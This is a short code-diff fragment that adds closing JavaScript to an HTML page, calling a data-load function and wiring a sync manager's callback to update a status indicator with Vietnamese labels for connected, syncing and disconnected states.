+        loadData();
+      }
+      
+      if (window.syncManager) {
+        window.syncManager.onSync = (status) => {
+          const dot = document.getElementById('syncDot');
+          const text = document.getElementById('syncText');
+          dot.className = `sync-dot sync-${status}`;
+          text.textContent = status === 'connected' ? 'Đồng bộ 24/7' : 
+                             status === 'syncing' ? 'Đang đồng bộ...' : 'Mất kết nối';
+        };
+      }
+    });
+  </script>
 </body>
 </html>
